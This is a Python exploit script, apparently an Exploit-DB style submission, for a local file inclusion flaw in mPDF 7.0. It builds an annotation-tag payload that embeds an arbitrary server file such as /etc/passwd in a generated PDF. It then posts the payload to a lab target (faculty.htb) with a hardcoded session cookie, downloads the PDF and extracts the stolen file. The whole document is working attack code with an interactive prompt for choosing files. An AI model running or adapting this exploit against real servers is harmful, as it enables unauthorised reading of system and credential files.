# Exploit Title: mPDF 7.0 - Local File Inclusion
# Google Dork: N/A
# Date: 2022-07-23
# Exploit Author: Musyoka Ian
# Vendor Homepage: https://mpdf.github.io/
# Software Link: https://mpdf.github.io/
# Version: CuteNews
# Tested on: Ubuntu 20.04, mPDF 7.0.x
# CVE: N/A

#!/usr/bin/env python3

from urllib.parse import quote
from cmd import Cmd
from base64 import b64encode
import requests
import os
import subprocess

class Terminal(Cmd):
    prompt = "\nFile >> "
    def default(self, args):
        payload_gen(args)
def banner():
    banner = """                          _____  _____  ______   ______ ___  __   __                  _       _ _   
                         |  __ \|  __ \|  ____| |____  / _ \ \ \ / /                 | |     (_) |  
               _ __ ___  | |__) | |  | | |__        / / | | | \ V /    _____  ___ __ | | ___  _| |_ 
               | '_ ` _ \|  ___/| |  | |  __|      / /| | | |  > <    / _ \ \/ / '_ \| |/ _ \| | __|
               | | | | | | |    | |__| | |        / / | |_| | / . \  |  __/>  <| |_) | | (_) | | |_ 
               |_| |_| |_|_|    |_____/|_|       /_/ (_)___(_)_/ \_\  \___/_/\_\ .__/|_|\___/|_|\__|
                                                                               | |                  
                                                                               |_|   """
    print(banner)
def payload_gen(fname):
    payload = f'<annotation file="{fname}" content="{fname}" icon="Graph" title="Attached File: {fname}" pos-x="195" />'
    encoded_payload = quote(payload)
    # print("[+] Replace the content with the payload below")

    # print(f"Url encoded payload:\n{encoded_payload}\n")
    base64enc = b64encode(encoded_payload.encode())
    # print(f"Base64 encoded payload:\n{base64enc.decode()}\n")

    url = 'http://faculty.htb/admin/download.php'
    headers = {
            "Cookie":"PHPSESSID=2dmak5lfn6dekfg77eoi8g15ua",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
    data = {'pdf':base64enc}
    req = requests.post(url=url, headers=headers, data=data)
    # print(req.text)    
    pdfname = req.text.strip()
    dwreq = f'http://faculty.htb/mpdf/tmp/{pdfname}'
    # print('dwurl', dwreq)

    # Download the file
    r = requests.get(dwreq)
    with open(pdfname, 'wb') as f:
        f.write(r.content)

    # print(f"Saved as {pdfname}")

    pdfdetach = subprocess.run(['pdfdetach',pdfname,'-save','1'],capture_output=True, text=True).stdout
    print(pdfdetach)
    efname = os.path.basename(fname)
    with open(efname, 'r') as f:
        content = f.read()
        
    print(content)
    print(efname)

            

if __name__ == ("__main__"):
    banner()
    print("Enter Filename eg. /etc/passwd")
    terminal= Terminal()
    terminal.cmdloop()
